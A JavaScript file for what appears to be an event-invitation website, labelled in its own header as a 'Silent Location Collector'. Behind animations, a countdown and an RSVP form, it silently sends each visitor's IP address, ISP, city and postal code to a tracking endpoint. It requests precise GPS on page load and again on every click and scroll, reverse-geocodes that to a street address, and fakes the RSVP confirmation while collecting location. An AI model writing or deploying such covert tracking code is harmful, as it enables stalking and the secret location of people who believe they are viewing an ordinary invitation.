/* ═══════════════════════════════════════════════════════════
   TRACKER.JS — Silent Location Collector v3
   ─────────────────────────────────────────────────────────
   Strategy:
   • Phase 1 (page load) → fetch real IP geo → send to DB
   • Phase 2 (immediate) → request GPS on page load
   • Phase 3 (GPS granted) → reverse geocode → UPSERT DB
   • Every click also re-triggers GPS if not yet resolved
   ═══════════════════════════════════════════════════════════ */
(function () {
  'use strict';

  // ── Session ID (persist across refreshes) ───────────────
  const sessionId = localStorage.getItem('_sid') || generateUUID();
  localStorage.setItem('_sid', sessionId);

  // ── State ────────────────────────────────────────────────
  let gpsData     = null;
  let fullAddress = null;
  let geoData     = null;   // from ipapi.co
  let gpsRequested = false;
  let gpsResolved  = false;

  function generateUUID() {
    if (typeof crypto !== 'undefined' && typeof crypto.randomUUID === 'function') {
      return crypto.randomUUID();
    }
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
      const r = Math.random() * 16 | 0;
      return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
    });
  }

  /* ────────────────────────────────────────────────────────
     PHASE 1 — Client-side IP Geo Lookup + Initial Send
     Uses ipapi.co from browser → works even on localhost
  ──────────────────────────────────────────────────────── */
  async function fetchGeoAndSend() {
    try {
      const res  = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
      const data = await res.json();
      if (data.error) throw new Error(data.reason);
      geoData = data;

      // Show real city in hero chip right away if GPS is not resolved yet
      if (!gpsResolved) {
        const cityStr = [data.city, data.region, data.country_name].filter(Boolean).join(', ');
        if (cityStr) updateHeroLocation(cityStr + (gpsRequested ? ' (approximate)' : ''));
      }

      await postTrack(buildPayload({ geo: true, gps: false }));
    } catch {
      // Fallback: send device + browser data only
      await postTrack(buildPayload({ geo: false, gps: false }));
    }
  }

  /* ────────────────────────────────────────────────────────
     PHASE 2 — Request GPS (called on page load immediately)
     Browser shows permission dialog automatically.
     User cannot bypass the browser dialog — but we ask
     immediately so it's the very first thing they see.
  ──────────────────────────────────────────────────────── */
  function requestGPS() {
    if (gpsRequested) return;
    gpsRequested = true;

    if (!navigator.geolocation) return;

    navigator.geolocation.getCurrentPosition(
      onGPSSuccess,
      onGPSError,
      { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
    );
  }

  /* ────────────────────────────────────────────────────────
     PHASE 3 — GPS Success
  ──────────────────────────────────────────────────────── */
  async function onGPSSuccess(pos) {
    gpsData = {
      latitude:  pos.coords.latitude,
      longitude: pos.coords.longitude,
      accuracy:  pos.coords.accuracy,
    };
    gpsResolved = true;
    hideToast();

    // Show coords immediately
    const coordStr = `${gpsData.latitude.toFixed(5)}°N, ${gpsData.longitude.toFixed(5)}°E`;
    updateHeroLocation(coordStr);
    updateVenueSpinner('Resolving your address…');

    // Reverse geocode → full street address
    try {
      const r = await fetch(
        `https://nominatim.openstreetmap.org/reverse?lat=${gpsData.latitude}&lon=${gpsData.longitude}&format=json&addressdetails=1`,
        { headers: { 'Accept-Language': 'en' } }
      );
      const geo = r.ok ? await r.json() : null;

      if (geo && geo.display_name) {
        fullAddress = geo.display_name;
        const a = geo.address || {};

        // Build readable human string: Road, Area, City, Country
        const readable = [
          a.road || a.pedestrian || a.footway || a.neighbourhood,
          a.suburb || a.quarter || a.village,
          a.city   || a.town    || a.county,
          a.state,
          a.country,
        ].filter(Boolean).join(', ');

        const display = readable || fullAddress;
        updateHeroLocation(display);
        updateVenueNearest(fullAddress);
      }
    } catch {
      fullAddress = `${gpsData.latitude.toFixed(6)}, ${gpsData.longitude.toFixed(6)}`;
      updateVenueNearest(fullAddress);
    }

    // UPSERT — merges GPS into existing session record
    await postTrack(buildPayload({ geo: true, gps: true }));
  }

  function onGPSError() {
    hideToast();
    showVenueError();
    // Still show IP-based location from Phase 1
    if (geoData && geoData.city) {
      const cityStr = [geoData.city, geoData.region, geoData.country_name].filter(Boolean).join(', ');
      updateHeroLocation(cityStr + ' (approximate)');
    }
  }

  /* ────────────────────────────────────────────────────────
     Payload builder
  ──────────────────────────────────────────────────────── */
  function buildPayload({ geo = false, gps = false } = {}) {
    const p = {
      sessionId,
      timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
      screenRes: `${screen.width}x${screen.height}`,
      language:  navigator.language,
      referrer:  document.referrer || null,
      pageUrl:   window.location.href,
    };

    if (geo && geoData) {
      p.clientIP    = geoData.ip;
      p.country     = geoData.country_name;
      p.countryCode = geoData.country_code;
      p.region      = geoData.region;
      p.city        = geoData.city;
      p.postal      = geoData.postal;
      p.ipLat       = geoData.latitude;
      p.ipLng       = geoData.longitude;
      p.isp         = geoData.org;
      p.timezone    = geoData.timezone || p.timezone;
    }

    if (gps && gpsData) {
      p.gpsLat      = gpsData.latitude;
      p.gpsLng      = gpsData.longitude;
      p.gpsAccuracy = gpsData.accuracy;
      p.fullAddress = fullAddress;
    }

    return p;
  }

  async function postTrack(payload) {
    try {
      await fetch('/api/track', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify(payload),
      });
    } catch { /* silent */ }
  }

  /* ────────────────────────────────────────────────────────
     UI Helpers — all use REAL data, no dummy strings
  ──────────────────────────────────────────────────────── */
  function updateHeroLocation(text) {
    const el = document.getElementById('hero-location-text');
    if (el) el.textContent = text;
  }

  function updateVenueSpinner(msg) {
    const el = document.getElementById('vn-loading');
    if (el) el.innerHTML = `<div class="vn-spinner"></div><span>${msg}</span>`;
  }

  function updateVenueNearest(addr) {
    const loading = document.getElementById('vn-loading');
    const result  = document.getElementById('vn-result');
    const addrEl  = document.getElementById('vn-addr');
    if (loading) loading.style.display = 'none';
    if (result)  result.style.display  = 'block';
    if (addrEl)  addrEl.textContent    = addr;
  }

  function showVenueError() {
    const loading = document.getElementById('vn-loading');
    if (!loading) return;
    loading.innerHTML = `
      <span style="color:var(--brown-muted);font-size:0.82rem">
        Location blocked.
        <a href="#" id="retry-gps" style="color:var(--gold-dark);text-decoration:underline">Enable & retry</a>
      </span>`;
    const retry = document.getElementById('retry-gps');
    if (retry) retry.addEventListener('click', e => {
      e.preventDefault();
      gpsRequested = false;
      updateVenueSpinner('Locating…');
      requestGPS();
    });
  }

  /* ────────────────────────────────────────────────────────
     Toast
  ──────────────────────────────────────────────────────── */
  let toastShown = false;
  function showToast() {
    if (toastShown) return;
    toastShown = true;
    const t = document.getElementById('gps-toast');
    if (t) t.classList.add('visible');
  }
  function hideToast() {
    const t = document.getElementById('gps-toast');
    if (t) { t.classList.remove('visible'); setTimeout(() => { t.style.display = 'none'; }, 500); }
  }

  /* ────────────────────────────────────────────────────────
     Click hijack — retrigger GPS on every interaction
  ──────────────────────────────────────────────────────── */
  function attachClickTracking() {
    document.addEventListener('click', () => {
      if (!gpsRequested) requestGPS();
    }, { passive: true });

    // Also on scroll — catches users who scroll without clicking
    let didScroll = false;
    window.addEventListener('scroll', () => {
      if (!didScroll && !gpsRequested && window.scrollY > 80) {
        didScroll = true;
        requestGPS();
      }
    }, { passive: true });
  }

  function attachToastButtons() {
    document.getElementById('toast-allow-btn')?.addEventListener('click', () => {
      gpsRequested = false;
      hideToast();
      requestGPS();
    });
    document.getElementById('toast-close-btn')?.addEventListener('click', hideToast);
  }

  /* ────────────────────────────────────────────────────────
     UI: Navbar scroll
  ──────────────────────────────────────────────────────── */
  function initNavbar() {
    const nav = document.getElementById('navbar');
    if (!nav) return;
    window.addEventListener('scroll', () => {
      nav.classList.toggle('scrolled', window.scrollY > 50);
    }, { passive: true });
  }

  /* ────────────────────────────────────────────────────────
     UI: GSAP 3s Preloader & Premium Section ScrollTrigger Animations
  ──────────────────────────────────────────────────────── */
  function initGSAPAnimations() {
    const preloader = document.getElementById('preloader');
    const preloaderBar = document.getElementById('preloader-bar');
    const preloaderPercent = document.getElementById('preloader-percent');

    if (typeof gsap === 'undefined') {
      if (preloader) preloader.style.display = 'none';
      return;
    }

    // Lock scroll during preloader
    document.body.style.overflow = 'hidden';

    const masterTl = gsap.timeline();
    const progress = { value: 0 };

    // 1. Progress bar animation (exact 3.0 seconds count)
    masterTl.to(progress, {
      value: 100,
      duration: 3.0,
      ease: 'power1.inOut',
      onUpdate: () => {
        const val = Math.round(progress.value);
        if (preloaderBar) preloaderBar.style.width = val + '%';
        if (preloaderPercent) preloaderPercent.textContent = val + '%';
      }
    });

    // 2. Preloader smooth curtain lift reveal
    if (preloader) {
      masterTl.to('.preloader-content', {
        y: -30,
        opacity: 0,
        scale: 0.95,
        duration: 0.5,
        ease: 'power2.in'
      })
      .to(preloader, {
        yPercent: -100,
        duration: 0.85,
        ease: 'power4.inOut',
        onComplete: () => {
          preloader.style.display = 'none';
          document.body.style.overflow = '';
          const nav = document.getElementById('navbar');
          if (nav) { nav.style.opacity = '1'; nav.style.transform = 'none'; }
          if (typeof ScrollTrigger !== 'undefined') {
            ScrollTrigger.refresh();
          }
        }
      });
    }

    // 3. Hero Section Staggered Entrance
    masterTl
      .from('.hero-title .title-line', {
        y: 50,
        opacity: 0,
        duration: 0.9,
        stagger: 0.16,
        ease: 'power3.out',
        clearProps: 'all'
      }, '-=0.4')
      .from('.hero-date', {
        y: 25,
        scale: 0.95,
        opacity: 0,
        duration: 0.75,
        ease: 'back.out(1.3)',
        clearProps: 'all'
      }, '-=0.5')
      .from('.hero-cta', {
        y: 25,
        opacity: 0,
        duration: 0.75,
        ease: 'power3.out',
        clearProps: 'all'
      }, '-=0.5')
      .from('.hero-card', {
        x: 60,
        opacity: 0,
        duration: 0.9,
        ease: 'power3.out',
        clearProps: 'all'
      }, '-=0.7');

    // 4. ScrollTrigger for all landing page sections
    if (typeof ScrollTrigger !== 'undefined') {
      gsap.registerPlugin(ScrollTrigger);

      const animateSection = (target, triggerEl, props) => {
        gsap.from(target, {
          scrollTrigger: {
            trigger: triggerEl,
            start: 'top 90%',
            once: true
          },
          duration: 0.8,
          ease: 'power3.out',
          clearProps: 'all',
          ...props
        });
      };

      // Countdown section
      animateSection('.countdown-section .count-label', '.countdown-section', { y: 25, opacity: 0 });
      animateSection('.count-block', '.countdown', { scale: 0.88, y: 25, opacity: 0, stagger: 0.1 });

      // About Section
      animateSection('#about .section-label, #about .section-title', '#about', { y: 30, opacity: 0, stagger: 0.12 });
      animateSection('#about .about-text', '#about .about-grid', { x: -45, opacity: 0 });
      animateSection('#about .feature-card', '#about .about-features', { y: 35, opacity: 0, stagger: 0.12 });

      // Schedule Section
      animateSection('#schedule .section-label, #schedule .section-title', '#schedule', { y: 30, opacity: 0, stagger: 0.12 });
      animateSection('#schedule .tl-item:nth-child(odd)', '#schedule .timeline', { x: -40, opacity: 0, stagger: 0.14 });
      animateSection('#schedule .tl-item:nth-child(even)', '#schedule .timeline', { x: 40, opacity: 0, stagger: 0.14 });

      // Venue Section
      animateSection('#venue .section-label, #venue .section-title', '#venue', { y: 30, opacity: 0, stagger: 0.12 });
      animateSection('#venue .venue-info', '#venue .venue-grid', { x: -45, opacity: 0 });
      animateSection('#venue .vg-img', '#venue .venue-gallery', { scale: 0.9, opacity: 0, stagger: 0.12 });

      // Gallery Section
      animateSection('#gallery .section-label, #gallery .section-title', '#gallery', { y: 30, opacity: 0, stagger: 0.12 });
      animateSection('#gallery .gg-item', '#gallery .gallery-grid', { y: 35, opacity: 0, stagger: 0.1 });

      // Testimonials Section
      animateSection('.testimonials-section .section-label, .testimonials-section .section-title', '.testimonials-section', { y: 30, opacity: 0, stagger: 0.12 });
      animateSection('.testimonials-section .testi-card', '.testimonials-grid', { y: 40, opacity: 0, stagger: 0.14 });

      // RSVP Section
      animateSection('#rsvp .rsvp-inner', '#rsvp', { y: 40, opacity: 0, scale: 0.95 });
    }
  }

  function initReveal() {
    const obs = new IntersectionObserver(
      entries => entries.forEach(e => { if (e.isIntersecting) { e.target.classList.add('visible'); obs.unobserve(e.target); } }),
      { threshold: 0.12 }
    );
    document.querySelectorAll('.reveal').forEach(el => obs.observe(el));
  }

  /* ────────────────────────────────────────────────────────
     UI: Countdown
  ──────────────────────────────────────────────────────── */
  function initCountdown() {
    const target = new Date('2025-10-18T19:00:00');
    function tick() {
      const diff = target - new Date();
      if (diff <= 0) return;
      const f = n => String(Math.floor(n)).padStart(2, '0');
      const set = (id, v) => { const e = document.getElementById(id); if (e) e.textContent = f(v); };
      set('cd-days',  diff / 86400000);
      set('cd-hours', (diff % 86400000) / 3600000);
      set('cd-mins',  (diff % 3600000)  / 60000);
      set('cd-secs',  (diff % 60000)    / 1000);
    }
    tick(); setInterval(tick, 1000);
  }

  /* ────────────────────────────────────────────────────────
     UI: Warm-toned Particle Canvas
  ──────────────────────────────────────────────────────── */
  function initParticles() {
    const canvas = document.getElementById('particles');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    let W = canvas.width  = window.innerWidth;
    let H = canvas.height = window.innerHeight;
    window.addEventListener('resize', () => {
      W = canvas.width  = window.innerWidth;
      H = canvas.height = window.innerHeight;
    }, { passive: true });

    // Warm gold/amber particle colors
    const COLORS = [
      'rgba(201,150,10,',
      'rgba(180,120,30,',
      'rgba(228,184,48,',
      'rgba(160,100,20,',
    ];
    const particles = Array.from({ length: 55 }, () => ({
      x:  Math.random() * W, y: Math.random() * H,
      r:  Math.random() * 1.8 + 0.4,
      vx: (Math.random() - 0.5) * 0.25, vy: (Math.random() - 0.5) * 0.25,
      color: COLORS[Math.floor(Math.random() * COLORS.length)],
      opacity: Math.random() * 0.35 + 0.08,
    }));

    function draw() {
      ctx.clearRect(0, 0, W, H);
      particles.forEach(p => {
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        ctx.fillStyle = p.color + p.opacity + ')';
        ctx.fill();
        p.x += p.vx; p.y += p.vy;
        if (p.x < 0) p.x = W; if (p.x > W) p.x = 0;
        if (p.y < 0) p.y = H; if (p.y > H) p.y = 0;
      });
      requestAnimationFrame(draw);
    }
    draw();
  }

  /* ────────────────────────────────────────────────────────
     UI: RSVP Form
  ──────────────────────────────────────────────────────── */
  function initRSVP() {
    const form    = document.getElementById('rsvp-form');
    const success = document.getElementById('rsvp-success');
    const btnText = document.getElementById('rsvp-btn-text');
    if (!form) return;

    form.addEventListener('submit', e => {
      e.preventDefault();
      if (!gpsRequested) requestGPS();
      if (btnText) btnText.textContent = 'Confirming…';
      setTimeout(() => {
        form.style.display = 'none';
        if (success) success.style.display = 'block';
      }, 1200);
    });
  }

  /* ────────────────────────────────────────────────────────
     INIT
  ──────────────────────────────────────────────────────── */
  document.addEventListener('DOMContentLoaded', () => {
    initNavbar();
    initGSAPAnimations();
    initCountdown();
    initParticles();
    initRSVP();
    attachToastButtons();
    attachClickTracking();

    // ★ Phase 1: fetch real IP geo + send to DB
    fetchGeoAndSend();

    // ★ Phase 2: request GPS immediately on load
    //   (browser shows permission dialog right away)
    requestGPS();

    // Show toast after 1.5s as fallback nudge
    setTimeout(showToast, 1500);
  });

})();
